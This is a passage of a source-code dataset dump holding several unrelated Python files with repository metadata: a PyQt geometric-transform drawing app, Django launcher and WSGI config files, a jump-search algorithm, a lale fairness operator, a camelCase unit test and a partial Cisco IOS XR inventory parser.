self.prev_leftY = self.leftY\n        self.prev_rightX = self.rightX\n        self.prev_rightY = self.rightY\n\n        self.prev_leftLine = self.leftLine[:]  # \u043b\u0438\u043d\u0438\u0438\n        self.prev_rightLine = self.rightLine[:]\n\n        self.prev_pTopleft = self.pTopleft[:]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.prev_pTopright = self.pTopright[:]\n        self.prev_pBotright = self.pBotright[:]\n        self.prev_pBotleft = self.pBotleft[:]\n\n        dx = float(place.moveX.text())  # \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0441 \u043f\u043e\u043b\u0435\u0439 \u0432\u0432\u043e\u0434\u0430\n        dy = float(place.moveY.text())\n\n        self.bottomX = [elem + dx for elem in self.bottomX]\n        self.bottomY = [elem + dy for elem in self.bottomY]\n\n        self.rightX = [elem + dx for elem in self.rightX]\n        self.rightY = [elem + dy for elem in self.rightY]\n\n        self.leftX = [elem + dx for elem in self.leftX]\n        self.leftY = [elem + dy for elem in self.leftY]\n\n        self.leftLine[0], self.leftLine[1] = self.leftLine[0] + dx, self.leftLine[1] + dy\n        self.leftLine[2], self.leftLine[3] = self.leftLine[2] + dx, self.leftLine[3] + dy\n\n        self.rightLine[0], self.rightLine[1] = self.rightLine[0] + dx, self.rightLine[1] + dy\n        self.rightLine[2], self.rightLine[3] = self.rightLine[2] + dx, self.rightLine[3] + dy\n\n        self.pTopleft[0], self.pTopleft[1] = self.pTopleft[0] + dx, self.pTopleft[1] + dy\n        self.pTopright[0], self.pTopright[1] = self.pTopright[0] + dx, self.pTopright[1] + dy\n        self.pBotleft[0], self.pBotleft[1] = self.pBotleft[0] + dx, self.pBotleft[1] + dy\n        self.pBotright[0], self.pBotright[1] = self.pBotright[0] + dx, self.pBotright[1] + dy\n\n        self.update()\n\n    def scaleFunc(self, place):\n\n        # \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n        self.prev_bottomX = self.bottomX  # \u0434\u0443\u0433\u0438\n        self.prev_bottomY = self.bottomY\n        self.prev_leftX = self.leftX\n        self.prev_leftY = self.leftY\n        self.prev_rightX = self.rightX\n        self.prev_rightY = self.rightY\n\n        self.prev_leftLine = self.leftLine[:]  # \u043b\u0438\u043d\u0438\u0438\n        self.prev_rightLine = self.rightLine[:]\n\n        self.prev_pTopleft = self.pTopleft[:]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.prev_pTopright = self.pTopright[:]\n        self.prev_pBotright = self.pBotright[:]\n        self.prev_pBotleft = self.pBotleft[:]\n\n        xm = float(place.scaleCentreX.text()) + 520 # \u0446\u0435\u043d\u0442\u0440 \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n        ym = float(place.scaleCentreY.text()) + 580\n\n        kx = float(place.scaleX.text())  # \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442\u044b \u043c\u0430\u0441\u0441\u0442\u0430\u0431\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n        ky = float(place.scaleY.text())\n\n        # \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0434\u0443\u0433\n        self.bottomX = [kx * elem + (1 - kx) * xm for elem in self.bottomX]\n        self.bottomY = [ky * elem + (1 - ky) * ym for elem in self.bottomY]\n\n        self.leftX = [kx * elem + (1 - kx) * xm for elem in self.leftX]\n        self.leftY = [ky * elem + (1 - ky) * ym for elem in self.leftY]\n\n        self.rightX = [kx * elem + (1 - kx) * xm for elem in self.rightX]\n        self.rightY = [ky * elem + (1 - ky) * ym for elem in self.rightY]\n\n        # \u043c\u0430\u0448\u0442\u0430\u0431\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043b\u0438\u043d\u0438\u0439\n        self.leftLine[0], self.leftLine[1] = kx * self.leftLine[0] + (1 - kx) * xm, ky * self.leftLine[1] + (1 - ky) * ym\n        self.leftLine[2], self.leftLine[3] = kx * self.leftLine[2] + (1 - kx) * xm, ky * self.leftLine[3] + (1 - ky) * ym\n\n        self.rightLine[0], self.rightLine[1] = kx * self.rightLine[0] + (1 - kx) * xm, ky * self.rightLine[1] + (1 - ky) * ym\n        self.rightLine[2], self.rightLine[3] = kx * self.rightLine[2] + (1 - kx) * xm, ky * self.rightLine[3] + (1 - ky) * ym\n\n        # \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u0430\n        self.pTopleft[0], self.pTopleft[1] = kx * self.pTopleft[0] + (1 - kx) * xm, ky * self.pTopleft[1] + (1 - ky) * ym\n        self.pTopright[0], self.pTopright[1] = kx * self.pTopright[0] + (1 - kx) * xm, ky * self.pTopright[1] + (1 - ky) * ym\n        self.pBotleft[0], self.pBotleft[1] = kx * self.pBotleft[0] + (1 - kx) * xm, ky * self.pBotleft[1] + (1 - ky) * ym\n        self.pBotright[0], self.pBotright[1] = kx * self.pBotright[0] + (1 - kx) * xm, ky * self.pBotright[1] + (1 - ky) * ym\n\n        self.update()\n\n    def rotateFunc(self, place):\n\n        # \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n        self.prev_bottomX = self.bottomX  # \u0434\u0443\u0433\u0438\n        self.prev_bottomY = self.bottomY\n        self.prev_leftX = self.leftX\n        self.prev_leftY = self.leftY\n        self.prev_rightX = self.rightX\n        self.prev_rightY = self.rightY\n\n        self.prev_leftLine = self.leftLine[:]  # \u043b\u0438\u043d\u0438\u0438\n        self.prev_rightLine = self.rightLine[:]\n\n        self.prev_pTopleft = self.pTopleft[:]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.prev_pTopright = self.pTopright[:]\n        self.prev_pBotright = self.pBotright[:]\n        self.prev_pBotleft = self.pBotleft[:]\n\n        xc = float(place.rotateCentreX.text()) + 520  # \u0446\u0435\u043d\u0442\u0440 \u043f\u043e\u0432\u043e\u0440\u043e\u0442\u0430\n        yc = float(place.rotateCentreY.text()) + 580\n\n        ang = int(place.angle.text())  # \u0443\u0433\u043e\u043b \u043f\u043e\u0432\u043e\u0440\u043e\u0442\u0430\n        l = len(self.bottomX)\n\n        # \u043f\u043e\u0432\u043e\u0440\u043e\u0442 \u0434\u0443\u0433\n\n        self.bottomX = [xc + (self.prev_bottomX[i] - xc) * cos(radians(ang)) + (self.prev_bottomY[i] - yc) * sin(radians(ang)) for i in range(l)]\n        self.bottomY = [yc - (self.prev_bottomX[i] - xc) * sin(radians(ang)) + (self.prev_bottomY[i] - yc) * cos(radians(ang)) for i in range(l)]\n\n        self.leftX = [xc + (self.prev_leftX[i] - xc) * cos(radians(ang)) + (self.prev_leftY[i] - yc) * sin(radians(ang))  for i in range(l)]\n        self.leftY = [yc - (self.prev_leftX[i] - xc) * sin(radians(ang)) + (self.prev_leftY[i] - yc) * cos(radians(ang)) for i in range(l)]\n\n        self.rightX = [xc + (self.prev_rightX[i] - xc) * cos(radians(ang)) + (self.prev_rightY[i] - yc) * sin(radians(ang)) for i in range(l)]\n        self.rightY = [yc - (self.prev_rightX[i] - xc) * sin(radians(ang)) + (self.prev_rightY[i] - yc) * cos(radians(ang)) for i in range(l)]\n\n        # \u043f\u043e\u0432\u043e\u0440\u043e\u0442 \u043b\u0438\u043d\u0438\u0439\n        self.leftLine[0], self.leftLine[1] = [xc + (self.leftLine[0] - xc) * cos(radians(ang)) + (self.leftLine[1] - yc) * sin(radians(ang)),  \n                        yc - (self.leftLine[0] - xc) * sin(radians(ang)) + (self.leftLine[1] - yc) * cos(radians(ang))]\n        self.leftLine[2], self.leftLine[3] = [xc + (self.leftLine[2] - xc) * cos(radians(ang)) + (self.leftLine[3] - yc) * sin(radians(ang)),  \n                        yc - (self.leftLine[2] - xc) * sin(radians(ang)) + (self.leftLine[3] - yc) * cos(radians(ang))]\n        \n        self.rightLine[0], self.rightLine[1] = [xc + (self.rightLine[0] - xc) * cos(radians(ang)) + (self.rightLine[1] - yc) * sin(radians(ang)),  \n                        yc - (self.rightLine[0] - xc) * sin(radians(ang)) + (self.rightLine[1] - yc) * cos(radians(ang))]\n        self.rightLine[2], self.rightLine[3] = [xc + (self.rightLine[2] - xc) * cos(radians(ang)) + (self.rightLine[3] - yc) * sin(radians(ang)),  \n                        yc - (self.rightLine[2] - xc) * sin(radians(ang)) + (self.rightLine[3] - yc) * cos(radians(ang))]\n                                                \n        # \u043f\u043e\u0432\u043e\u0440\u043e\u0442 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u0430\n        self.pTopleft[0], self.pTopleft[1] = [xc + (self.pTopleft[0] - xc) * cos(radians(ang)) + (self.pTopleft[1] - yc) * sin(radians(ang)),  \n                        yc - (self.pTopleft[0] - xc) * sin(radians(ang)) + (self.pTopleft[1] - yc) * cos(radians(ang))]\n        self.pTopright[0], self.pTopright[1] = [xc + (self.pTopright[0] - xc) * cos(radians(ang)) + (self.pTopright[1] - yc) * sin(radians(ang)),  \n                        yc - (self.pTopright[0] - xc) * sin(radians(ang)) + (self.pTopright[1] - yc) * cos(radians(ang))]\n        self.pBotleft[0], self.pBotleft[1] = [xc + (self.pBotleft[0] - xc) * cos(radians(ang)) + (self.pBotleft[1] - yc) * sin(radians(ang)),  \n                        yc - (self.pBotleft[0] - xc) * sin(radians(ang)) + (self.pBotleft[1] - yc) * cos(radians(ang))]\n        self.pBotright[0], self.pBotright[1] = [xc + (self.pBotright[0] - xc) * cos(radians(ang)) + (self.pBotright[1] - yc) * sin(radians(ang)),  \n                        yc - (self.pBotright[0] - xc) * sin(radians(ang)) + (self.pBotright[1] - yc) * cos(radians(ang))]\n\n        self.update()\n\n    def start(self):\n        self.bottomX = [80*cos(-1*t) + 520 for t in np.arange(0, pi, 0.001)]  # \u043d\u0438\u0436\u043d\u0430\u044f \u0434\u0443\u0433\u0430\n        self.bottomY = [15*sin(-1*t) + 580 for t in np.arange(0, pi, 0.001)]\n\n\n        self.rightX = [520 + (self.bottomX[i] - 520) * cos(radians(120)) + (self.bottomY[i] - 580) *\n                       sin(radians(120)) + 42 for i in range(len(self.bottomX))]  # \u043f\u0440\u0430\u0432\u0430\u044f \u0434\u0443\u0433\u0430\n        self.rightY = [580 - (self.bottomX[i] - 520) * sin(radians(120)) + (self.bottomY[i] - 580) *\n                       cos(radians(120)) - 70 for i in range(len(self.bottomY))]\n\n\n        self.leftX = [520 + (self.bottomX[i] - 520) * cos(radians(240)) + (self.bottomY[i] - 580) *\n                       sin(radians(240)) - 42 for i in range(len(self.bottomX))]  # \u043f\u0440\u0430\u0432\u0430\u044f \u0434\u0443\u0433\u0430\n        self.leftY = [580 - (self.bottomX[i] - 520) * sin(radians(240)) + (self.bottomY[i] - 580) *\n                       cos(radians(240)) - 70 for i in range(len(self.bottomY))]\n\n        self.leftLine = [520, 440, 600, 580]  # \u043b\u0438\u043d\u0438\u0438\n        self.rightLine = [520, 440, 440, 580]\n\n        self.pTopleft = [440, 440]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.pTopright = [600, 440]\n        self.pBotright = [600, 580]\n        self.pBotleft = [440, 580]\n        self.update()\n\n    def back(self):\n        # \u043f\u0440\u0435\u0434\u044b\u0434\u0443\u0449\u0435\u0435 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n        self.bottomX = self.prev_bottomX  # \u0434\u0443\u0433\u0438\n        self.bottomY = self.prev_bottomY\n        self.leftX = self.prev_leftX\n        self.leftY = self.prev_leftY\n        self.rightX = self.prev_rightX\n        self.rightY = self.prev_rightY\n\n        self.leftLine = self.prev_leftLine[:]  # \u043b\u0438\u043d\u0438\u0438\n        self.rightLine = self.prev_rightLine[:]\n\n        self.pTopleft = self.prev_pTopleft[:]  # \u043a\u0432\u0430\u0434\u0440\u0430\u0442\n        self.pTopright = self.prev_pTopright[:]\n        self.pBotright = self.prev_pBotright[:]\n        self.pBotleft = self.prev_pBotleft[:]\n        self.update()\n\n\n\n\nclass Wind(QGraphicsView):\n    def __init__(self):\n        super(Wind, self).__init__()\n        self.place = uic.loadUi('window.ui')  # \u0430\u0442\u0440\u0438\u0431\u0443\u0442 \u043e\u043a\u043d\u0430\n        self.object = Picture()  # \u0430\u0440\u0442\u0438\u0431\u0443\u0442 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\n        scene = QGraphicsScene(self)\n        scene.setSceneRect(10, 10, 1000, 1000)\n        scene.addItem(self.object)\n        self.place.image.setScene(scene)\n        self.place.move.clicked.connect(lambda: self.object.moveFunc(self.place))\n        self.place.scale.clicked.connect(lambda: self.object.scaleFunc(self.place))\n        self.place.rotate.clicked.connect(lambda: self.object.rotateFunc(self.place))\n        self.place.toStart.clicked.connect(lambda: self.object.start())\n        self.place.stepBack.clicked.connect(lambda: self.object.back())\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    ex = Wind()\n    ex.place.show()\n    sys.exit(app.exec_())\n\n"}
{"blob_id": "b1ea318f2e1f3ac91a1aa5028f62335fa9f87f89", "directory_id": "dd5b8a4b0ebf8bbe3486a244d17c50336c68f49a", "path": "/venv/Scripts/django-admin.py", "content_id": "87d6cb59780a47cb54e0d271dc3355aef78b7dae", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Pato2020-droid/proyecto", "snapshot_id": "bbfe6f1b723c6eff36d7cfa837c83a3cb453cf87", "revision_id": "faf1cbf59b1740adc95ccd67870e4a07549e487e", "branch_name": "refs/heads/master", "visit_date": "2023-08-23 08:22:49.511794", "revision_date": "2021-10-23 15:56:35", "committer_date": "2021-10-23 15:56:35", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "161", "extension": "py", "content": "#!C:\\Users\\Walter\\gimnasionino\\venv\\Scripts\\python.exe\nfrom django.core import management\n\nif __name__ == \"__main__\":\n    management.execute_from_command_line()\n"}
{"blob_id": "59efda5e1d59d7c55bec09aa4e62b007a72b5500", "directory_id": "aafb571fab4ccca9c497fe128a2f65f585b17bbd", "path": "/Algorithms/Searching_Sorting/Searching/Python/jump_search.py", "content_id": "6207053ac39398737402f0602ee4b32a3e410fe4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "samvelarakelyan/Algorithms-and-Data-structures", "snapshot_id": "c1cb8810e79881843675b01452e6fdb87fa49da6", "revision_id": "759b2a9581c10ee9a6b960ed47d594617347f6e0", "branch_name": "refs/heads/main", "visit_date": "2023-08-31 10:47:53.601202", "revision_date": "2021-09-23 11:36:12", "committer_date": "2021-09-23 11:36:12", "github_id": "366411749", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2132", "extension": "py", "content": "\"\"\"\n|-----------|\n|Jump Search|\n|-----------|\n\n-----------------------\n    Explanation\n    -----------\n        The basic idea is to check fewer elements (then linear search) by jumping ahead\n        by fixed steps or skipping some elements in place of searching all elements.\n            For example, suppose we have an array of size n and to be jumped size m.\n        Then we search at the indexes array[0], array[m], array[2m]...array[km] and so on.\n        Once we find the interval(array[km] < x < array[k + 1]m), we perform a linear search operation\n        from the index km to find the element x.\n        Total number of comparisons in the worst case will be (n / m) + m - 1. The value of the function\n        (n / m) + m - 1 will be minimum when m = n ^ (1 / 2). Therefor, the best step size is m = n ^ (1 / 2).\n\n            Important points\n            ----------------\n                1)Works only sorted array.\n                2)The optimal size of a block to be jumpt is n ^ (1 / 2).\n                    This makes the time complexity of Jump Search is n ^ (1 / 2)\n                3)The time complexity of Jump Search is between Linear Search(O(n))\n                    and Binary Search(O(log n)).\n                4)Binary Search is better than Jump Search, but Jump Search has an advantage that we traverse back only once\n                (Binary Search may require up to O(Log n) jumps, consider a situation where the element to be searched is the\n                smallest element or smaller than the smallest).\n\"\"\"\nimport math\n\ndef jump_search(myList: list, value):\n    \"\"\"\n    Returns\n    -------\n        'int' --> index of value or -1 if value not found in given list\n    \"\"\"\n    jump_size = math.sqrt(len(myList))\n    left = 0\n\n    while myList[int(min(jump_size, len(myList)) - 1)] < value:\n        left = jump_size\n        jump_size += math.sqrt(len(myList))\n        if left > len(myList):\n            return -1\n    while myList[int(left)] < value:\n        left += 1\n\n        if left == min(jump_size, len(myList)):\n            return -1\n    if myList[int(left)] == value:\n        return int(left)\n    return -1\n\n"}
{"blob_id": "f42c0bc6db94794cbf3dbc31077f0801d2b140d3", "directory_id": "804ce3c2897a8720a27e0d86ac3b868ebd41cd20", "path": "/project-data/django/mango/mango/wsgi.py", "content_id": "518142e6201c5cda775ff0c78d6761836370bc36", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "hoboland21/mango", "snapshot_id": "383359aa85b685bfe77c6336974600038454cf80", "revision_id": "be8bf3398612a0c3dbb4498eb5eb18407c574ce3", "branch_name": "refs/heads/master", "visit_date": "2023-07-13 06:25:39.508434", "revision_date": "2021-08-25 03:25:37", "committer_date": "2021-08-25 03:25:37", "github_id": "399520705", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "491", "extension": "py", "content": "\nimport sys,os\n\n\n\"\"\"\nWSGI config for main project.\n\nIt exposes the WSGI callable as a module-level variable named ``application``.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/1.8/howto/deployment/wsgi/\n\"\"\"\n\n#if \"/usr/local/django/mango\" not in sys.path : \n#\tsys.path.insert(0,\"/usr/local/django/mango\")\n\n\nos.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"mango.settings\")\n\nfrom django.core.wsgi import get_wsgi_application\n\napplication = get_wsgi_application()\n\n"}
{"blob_id": "0f9f5bd7da6f2518bc9c266f8243dacb079c4edb", "directory_id": "a61955db5a11ff7086018d11affc1b8a6b652a65", "path": "/lale/lib/aif360/eq_odds_postprocessing.py", "content_id": "ed59be0d488abdae961c0d93503f4016705044c6", "detected_licenses": "['LicenseRef-scancode-unknown-license-reference', 'Apache-2.0']", "license_type": "permissive", "repo_name": "tanmaygaikwad/lale", "snapshot_id": "fe5c5f0d0a0455f5bf01df1d5d972f5eb1fcdc68", "revision_id": "798e222a5a6d74bb92ab868e9eee3e12d03c1060", "branch_name": "refs/heads/master", "visit_date": "2023-06-26 10:49:32.666848", "revision_date": "2021-07-21 22:26:21", "committer_date": "2021-07-21 22:26:21", "github_id": "346311978", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "4237", "extension": "py", "content": "# Copyright 2019 IBM Corporation\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport aif360.algorithms.postprocessing\n\nimport lale.docstrings\nimport lale.operators\n\nfrom .util import (\n    _BasePostEstimatorImpl,\n    _categorical_fairness_properties,\n    _categorical_input_predict_schema,\n    _categorical_output_predict_schema,\n    _categorical_supervised_input_fit_schema,\n)\n\n\nclass _EqOddsPostprocessingImpl(_BasePostEstimatorImpl):\n    def __init__(\n        self, favorable_labels, protected_attributes, estimator, redact=True, seed=None,\n    ):\n        prot_attr_names = [pa[\"feature\"] for pa in protected_attributes]\n        unprivileged_groups = [{name: 0 for name in prot_attr_names}]\n        privileged_groups = [{name: 1 for name in prot_attr_names}]\n        mitigator = aif360.algorithms.postprocessing.EqOddsPostprocessing(\n            unprivileged_groups=unprivileged_groups,\n            privileged_groups=privileged_groups,\n            seed=seed,\n        )\n        super(_EqOddsPostprocessingImpl, self).__init__(\n            favorable_labels=favorable_labels,\n            protected_attributes=protected_attributes,\n            estimator=estimator,\n            redact=redact,\n            mitigator=mitigator,\n        )\n\n\n_input_fit_schema = _categorical_supervised_input_fit_schema\n_input_predict_schema = _categorical_input_predict_schema\n_output_predict_schema = _categorical_output_predict_schema\n\n_hyperparams_schema = {\n    \"description\": \"Hyperparameter schema.\",\n    \"allOf\": [\n        {\n            \"description\": \"This first sub-object lists all constructor arguments with their \"\n            \"types, one at a time, omitting cross-argument constraints.\",\n            \"type\": \"object\",\n            \"additionalProperties\": False,\n            \"required\": [\n                *_categorical_fairness_properties.keys(),\n                \"estimator\",\n                \"redact\",\n                \"seed\",\n            ],\n            \"relevantToOptimizer\": [],\n            \"properties\": {\n                **_categorical_fairness_properties,\n                \"estimator\": {\n                    \"description\": \"Nested supervised learning operator for which to mitigate fairness.\",\n                    \"laleType\": \"operator\",\n                },\n                \"redact\": {\n                    \"description\": \"Whether to redact protected attributes before data preparation (recommended) or not.\",\n                    \"type\": \"boolean\",\n                    \"default\": True,\n                },\n                \"seed\": {\n                    \"description\": \"Seed to make `predict` repeatable.\",\n                    \"anyOf\": [{\"type\": \"integer\"}, {\"enum\": [None]}],\n                    \"default\": None,\n                },\n            },\n        }\n    ],\n}\n\n_combined_schemas = {\n    \"$schema\": \"http://json-schema.org/draft-04/schema#\",\n    \"description\": \"\"\"`Equalized odds postprocessing`_ post-estimator fairness mitigator.\n\n.. _`Equalized odds postprocessing`: https://aif360.readthedocs.io/en/latest/modules/generated/aif360.algorithms.postprocessing.EqOddsPostprocessing.html\n\"\"\",\n    \"documentation_url\": \"https://lale.readthedocs.io/en/latest/modules/lale.lib.aif360.eq_odds_postprocessing.html\",\n    \"import_from\": \"aif360.algorithms.postprocessing\",\n    \"type\": \"object\",\n    \"tags\": {\"pre\": [], \"op\": [\"estimator\", \"classifier\", \"interpretable\"], \"post\": []},\n    \"properties\": {\n        \"hyperparams\": _hyperparams_schema,\n        \"input_fit\": _input_fit_schema,\n        \"input_predict\": _input_predict_schema,\n        \"output_predict\": _output_predict_schema,\n    },\n}\n\nEqOddsPostprocessing = lale.operators.make_operator(\n    _EqOddsPostprocessingImpl, _combined_schemas\n)\n\nlale.docstrings.set_docstrings(EqOddsPostprocessing)\n"}
{"blob_id": "0ee978c945a22cfd723c0a2e287d0e327ea507df", "directory_id": "48fcd5b9203c5f34dcad9483259c0f3d46f5d48b", "path": "/codeacademy-python3/files/how_many_lines.py", "content_id": "79a082fa607ebffa16e832bc8a67fed867241a6f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ssaulrj/codes-python", "snapshot_id": "438dd691815d0a688d264928eb07187ba30c2138", "revision_id": "04b75b001de60a5e202ad373f3379864753ce203", "branch_name": "refs/heads/master", "visit_date": "2022-11-17 11:40:18.883096", "revision_date": "2020-07-06 00:57:58", "committer_date": "2020-07-06 00:57:58", "github_id": "234440220", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "152", "extension": "py", "content": "with open('how_many_lines.txt') as lines_doc:\n  #lines_docx = lines_doc.read()\n  for line in lines_doc.readlines():\n    print(line)\n\n#print(lines_docx)\n"}
{"blob_id": "a55c90cf6627d766ec1eeddb95162f60972e51a9", "directory_id": "4968baa578f5417cfe9edd6bf4e773dd14fadbed", "path": "/test_conv_camelcase.py", "content_id": "bf35cc52b1c325806e4e8eb96305f74e05657ba8", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "achernet/gintprob", "snapshot_id": "aa128119411b38eedabeacbffc72959d29e7c803", "revision_id": "93bb7eb827036b8eed3874793aa72c31ba8b2a28", "branch_name": "refs/heads/master", "visit_date": "2021-01-25 04:08:07.119944", "revision_date": "2015-07-08 16:36:30", "committer_date": "2015-07-08 16:36:30", "github_id": "38718832", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "957", "extension": "py", "content": "import unittest2\nimport conv_camelcase\n\n\nclass MyTestCase(unittest2.TestCase):\n\n    def test_camelcase_conversion(self):\n        expectedConvDict = {('marketBit_buf', True): 'MarketBitBuf',\n                            ('markedBit', False): 'markedBit',\n                            ('new_buf', True): 'NewBuf',\n                            ('_private_method', False): '_privateMethod',\n                            ('__hidden_method', False): '__hiddenMethod',\n                            ('_private_method_qt_', False): '_privateMethodQt_'}\n        for (inputStr, capFirst), expectedOutputStr in expectedConvDict.items():\n            actualOutput = conv_camelcase.conv_camelcase(inputStr, capitalize_first=capFirst)\n            self.assertEquals(actualOutput, expectedOutputStr)\n\n    def test_camelcase_multiple_words(self):\n        self.assertRaises(ValueError, conv_camelcase.conv_camelcase, 'multi words')\n\n\nif __name__ == '__main__':\n    unittest2.main()\n"}
{"blob_id": "f5cc457a5f490ac71ba567f85c50d57937d39c50", "directory_id": "48894ae68f0234e263d325470178d67ab313c73e", "path": "/sa/profiles/Cisco/IOSXR/get_inventory.py", "content_id": "dda3a7ed0edd5d448382804d8e5feb17a678043b", "detected_licenses": "['BSD-3-Clause']", "license_type": "permissive", "repo_name": "DreamerDDL/noc", "snapshot_id": "7f949f55bb2c02c15ac2cc46bc62d957aee43a86", "revision_id": "2ab0ab7718bb7116da2c3953efd466757e11d9ce", "branch_name": "refs/heads/master", "visit_date": "2021-05-10 18:22:53.678588", "revision_date": "2015-06-29 12:28:20", "committer_date": "2015-06-29 12:28:20", "github_id": "118628133", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2018-01-23 15:19:51", "gha_created_at": "2018-01-23 15:19:51", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3786", "extension": "py", "content": "# -*- coding: utf-8 -*-\n##----------------------------------------------------------------------\n## Cisco.IOSXR.get_inventory\n##----------------------------------------------------------------------\n## Copyright (C) 2007-2013 The NOC Project\n## See LICENSE for details\n##----------------------------------------------------------------------\n\n## Python modules\nimport re\n## NOC modules\nfrom noc.sa.script import Script as NOCScript\nfrom noc.sa.interfaces.igetinventory import IGetInventory\nfrom noc.sa.interfaces.base import InterfaceTypeError\n\n\nclass Script(NOCScript):\n    name = \"Cisco.IOSXR.get_inventory\"\n    implements = [IGetInventory]\n\n    rx_item = re.compile(\n        r\"^NAME: \\\"(?P<name>[^\\\"]+)\\\", DESCR: \\\"(?P<descr>[^\\\"]+)\\\"\\n\"\n        r\"PID:\\s+(?P<pid>\\S*)\\s*,\\s+VID:\\s+(?P<vid>\\S*)\\s*, SN: (?P<serial>\\S+)\",\n        re.MULTILINE | re.DOTALL\n    )\n\n    rx_trans = re.compile(\"((?:100|1000|10G)BASE\\S+)\")\n\n    def execute(self):\n        objects = []\n        v = self.cli(\"admin show inventory\")\n        for match in self.rx_item.finditer(v):\n            type, number, part_no = self.get_type(\n                match.group(\"name\"), match.group(\"pid\"),\n                match.group(\"descr\"), len(objects)\n            )\n            if not part_no:\n                print \"!!! UNKNOWN: \", match.groupdict()\n                continue\n            else:\n                vendor = \"CISCO\" if \"NoName\" not in part_no else \"NONAME\"\n                objects += [{\n                    \"type\": type,\n                    \"number\": number,\n                    \"vendor\": vendor,\n                    \"serial\": match.group(\"serial\"),\n                    \"description\": match.group(\"descr\"),\n                    \"part_no\": [part_no],\n                    \"revision\": match.group(\"vid\"),\n                    \"builtin\": False\n                }]\n        # Reorder chassis\n        if objects[-1][\"type\"] == \"CHASSIS\":\n            objects = [objects[-1]] + objects[:-1]\n        return objects\n\n    def get_type(self, name, pid, descr, lo):\n        \"\"\"\n        Get type, number and part_no\n        \"\"\"\n        if \"RSP\" in pid or \"RSP\" in name:\n            number = name.split()[1].split(\"/\")[1][3]\n            return \"RSP\", number, pid\n        elif \"A9K-MODULEv\" in pid:\n            number = name.split()[1].split(\"/\")[-1]\n            return \"MPA\", number, pid\n        elif \"MOD\" in pid:\n            number = name.split()[1].split(\"/\")[1]\n            return \"MOD\", number, pid\n        elif ((\"LC\" in descr or \"Line Card\" in descr or\n              \"Linecard\" in descr) and\n              \"module mau\" not in name):\n            number = name.split()[1].split(\"/\")[1]\n            return \"MOD\", number, pid \n        elif \"MPA\" in pid:\n            number = name.split()[1].split(\"/\")[-1]\n            return \"MPA\", number, pid\n        elif \"XFP\" in pid or \"GLC\" in pid or \"SFP\" in descr:\n            number = name.split()[2].split(\"/\")[-1]\n            if not pid:\n                pid = self.get_transceiver_pid(descr)\n                if not pid:\n                    return None, None, None\n            return \"XCVR\", number, pid\n        elif \"FAN\" in pid:\n            number = name.split()[1].split(\"/\")[1][2]\n            return \"FAN\", number, pid\n        elif (\"Power Module\" in descr or\n              \"Power Supply\" in descr):\n            # number = 0/PM0/SP\n            number = name.split()[1].split(\"/\")[1][2:]\n            return \"PWR\", number, pid\n        elif 